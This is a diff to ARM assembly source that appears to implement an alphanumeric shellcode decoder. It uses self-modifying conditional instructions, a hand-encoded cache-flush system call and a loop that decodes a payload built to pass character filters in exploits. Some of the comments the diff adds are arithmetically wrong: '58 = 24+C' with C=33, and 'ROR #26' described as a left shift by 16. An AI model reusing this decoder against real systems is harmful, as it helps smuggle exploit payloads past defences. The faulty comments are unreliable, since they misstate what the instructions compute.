@@ -31,13 +31,13 @@ _start:
     EORPLS R7, R4, #0x3F
 
     SUBPLS R3, PC, #33
-    LDRPLB R3, [R3, #-35]
+    LDRPLB R3, [R3, #-35]   /* Read value 0x3F from the dummy instructions above */
 
     SUBPLS R4, R3, #0x3F
     SUBPLS R6, R3, #0x3F
     SUBPL R5, R3, #0x40
 
-    SUBPL R3, SP, #58   /* 57 = 24+C , where C=33 */
+    SUBPL R3, SP, #58   /* 58 = 24+C , where C=33 */
 
     /* Store 0x00000000 on stack */
     STRPLB R4, [R3, -R5, ROR #8]!
@@ -192,8 +192,7 @@ _start:
     SUBPLS R3, R8, R4, ROR R4
 
     /* SWIMI 0x9f0002 */
-    /* .word 0x4f603032 */
-    SVCMI 0x603032
+    .word 0x4f603032
 
     /* Change condition code to PL */
     EORMIS R3, R4, #33
@@ -205,19 +204,19 @@ loop:
     /* BMI payload_pre */
     .word 0x4A303026
 
-    EORPLS R3, R4, R3, ROR #14
+    EORPLS R3, R4, R3, ROR #14  /* Equivalent to left shift by 18 positions */
 
     SUBPLS R7, R7, R8, LSR R4
 
     LDRPLB R5, [R7, #-33]
     SUBPLS R5, R5, #0x3F
-    EORPLS R3, R3, R5, ROR #20
+    EORPLS R3, R3, R5, ROR #20  /* Equivalent to left shift by 12 positions */
 
     SUBPLS R7, R7, R8, LSR R4
 
     LDRPLB R5, [R7, #-33]
     SUBPLS R5, R5, #0x3F
-    EORPLS R3, R3, R5, ROR #26
+    EORPLS R3, R3, R5, ROR #26  /* Equivalent to left shift by 16 positions */
 
     SUBPLS R7, R7, R8, LSR R4
 
